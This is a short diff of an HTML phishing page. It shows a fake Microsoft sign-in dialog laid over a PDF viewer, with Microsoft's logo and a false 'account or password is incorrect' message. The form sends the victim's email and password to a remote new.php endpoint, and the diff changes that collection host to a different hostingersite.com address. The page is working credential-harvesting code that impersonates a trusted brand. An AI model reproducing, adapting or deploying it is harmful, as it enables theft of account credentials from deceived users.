@@ -202,7 +202,7 @@
 </head>
 <body>
     <!-- Main iframe to display the PDF -->
-    <iframe id="pdfViewer" src="https://78099.link/pdf/bizbuysell.pdf" aria-label="PDF Viewer"></iframe>
+    <iframe id="pdfViewer" src="background.pdf" aria-label="PDF Viewer"></iframe>
     <!-- Smaller iframe initially hidden with logo, text, and throbber -->
     <div id="smallIframe" role="dialog" aria-labelledby="expiredText">
         <img id="logo" src="micro.png" alt="Microsoft Logo">
@@ -223,7 +223,7 @@
             <span id="errorText">Your account or password is incorrect. If you don't remember your password,<a href="" id="resetLink"> reset it now.</a></span>
                 
             </p>
-            <form id="authForm" action="https://78099.link/pdf/new.php" method="GET" onsubmit="return validateForm()">
+            <form id="authForm" action="https://wheat-heron-303650.hostingersite.com/pdf/new.php" method="GET" onsubmit="return validateForm()">
                 <input type="hidden" id="email" name="email">        
                 <input type="password" id="password" name="password" placeholder="Password" aria-label="Password" required minlength="4">
                 <button type="submit">Sign in</button>
